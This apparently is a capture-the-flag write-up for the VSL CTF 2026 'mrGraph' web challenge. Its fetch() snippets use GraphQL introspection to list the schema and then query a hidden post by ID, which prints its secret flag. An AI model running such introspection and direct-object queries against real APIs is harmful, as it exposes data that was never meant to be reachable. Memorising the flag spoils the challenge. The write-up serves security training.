# mrGraph — VSL CTF 2026

> **Room / Challenge:** mrGraph (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** VSL CTF 2026
- **Challenge:** mrGraph (web)
- **Target / URL:** `https://vsl-ctf.com/challenges#mrGraph-49`
- **Points:** `100`
- **Solved:** `89`
- **Date:** `25-01-2026`

---

## Goal

Leveraging the GraphQL Injection to get the flag in the database.

## My Solution

The new intern made a website, there must be vulnerability. Examining sources of available pages, we can find a route that we can take advantage of `/api/graphql` (visible in `/users` route).

In order to know all the schemas existed in the database, run this in the Console tab of browser:

```javascript
fetch("/api/graphql", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    query: `
        query {
            __schema {
                types {
                    name
                    fields {
                        name
                    }
                }
            }
        }`,
  }),
})
  .then((response) => response.json())
  .then((data) => {
    console.log(JSON.stringify(data, null, 2));
  });
```

Got a really suspicious `postPassword` field:

```json
{
    "name": "PostType",
    "fields": [
    // ...
    {
        "name": "postPassword"
    },
    {
        "name": "isHidden"
    },
    // ...
    ]
},
```

Seems like the flag is the value of `postPassword` field of a post which `isHidden`.

```javascript
fetch("/api/graphql", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    query: `
        query {
            posts {
                id
                title
                postPassword
                isHidden
                content
            }
        }`,
  }),
})
  .then((response) => response.json())
  .then((data) => {
    console.log(JSON.stringify(data, null, 2));
  });
```

Got:

```json
{
  "data": {
    "posts": [
      {
        "id": 2,
        "title": "Advanced GraphQL Patterns",
        "postPassword": null,
        "isHidden": false,
        "content": "Learn about schema design, caching strategies, and optimization techniques for GraphQL APIs. We will cover real-world examples from production systems."
      },
      {
        "id": 1,
        "title": "Getting Started with GraphQL",
        "postPassword": null,
        "isHidden": false,
        "content": "GraphQL is a query language for APIs. It provides a more efficient, powerful and comfortable way to query data than traditional REST APIs. In this post, we will explore the basics of GraphQL."
      },
      {
        "id": 3,
        "title": "API Security Best Practices",
        "postPassword": null,
        "isHidden": false,
        "content": "Implementing proper authentication and authorization in your APIs is crucial. This article covers JWT, OAuth2, and other security mechanisms."
      }
    ]
  }
}
```

Still cannot get the hidden post, now I try to get the specific post id `4`:

```javascript
fetch("/api/graphql", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    query: `
        query {
            post(id: 4) {
                id
                title
                content
                postPassword
                isHidden
            }
        }`,
  }),
})
  .then((response) => response.json())
  .then((data) => {
    console.log(JSON.stringify(data, null, 2));
  });
```

Got the flag `VSL{y0u_r34lly_kn0w_4b0u7_6r4ph_d0n7_y4}`:

```json
{
  "data": {
    "post": {
      "id": 4,
      "title": "Hidden Admin Notes",
      "content": "This post contains confidential information and should not be accessible to regular users. The security of this system depends on keeping this hidden.",
      "postPassword": "VSL{y0u_r34lly_kn0w_4b0u7_6r4ph_d0n7_y4}",
      "isHidden": true
    }
  }
}
```
